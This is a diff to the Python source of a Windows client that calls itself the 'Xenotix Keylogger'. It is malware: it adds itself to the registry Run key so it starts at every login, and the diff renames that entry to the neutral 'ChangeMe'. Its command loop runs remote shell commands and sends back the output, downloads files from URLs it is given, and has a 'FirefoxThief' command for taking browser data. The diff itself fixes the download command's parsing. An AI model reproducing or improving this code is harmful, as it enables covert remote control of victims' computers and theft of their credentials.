@@ -104,7 +104,7 @@ def WindowsAutoStart():
         fp="C:\Python27\Scripts\dist\Windows-client.exe"
         keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
         key2change= OpenKey(HKEY_CURRENT_USER, keyVal,0,KEY_ALL_ACCESS)
-        SetValueEx(key2change, "Xenotix Keylogger",0,REG_SZ, fp)
+        SetValueEx(key2change, "ChangeMe",0,REG_SZ, fp)
         return "ok"
     except:
         return "error"
@@ -414,15 +414,16 @@ while 1:
     elif inText.startswith("exec"):
         outEXEC = EXEC(inText.split(":")[1])
         SendData(outEXEC)
+    elif inText.startswith("downhttp"):
         try:
-            if len(inText.split(":")) == 3:
-                DownHTTP(inText.split(":")[1],inText.split(":")[2])
+            if len(inText.split("|")) == 3:
+                DownHTTP(inText.split("|")[1],inText.split("|")[2])
                 SendData("Download complete!")
-            elif len(inText.split(":")) == 2:
-                DownHTTP(inText.split(":")[1],"")
+            elif len(inText.split("|")) == 2:
+                DownHTTP(inText.split("|")[1],"")
                 SendData("Download complete!")
             else:
-                SendData("Error! \n usage: downhttp:url:save.type")
+                SendData("Error! \n usage: downhttp|url|save.type")
         except IOError as err:
             SendData("Error "+str(err))
     elif inText == "FirefoxThief":
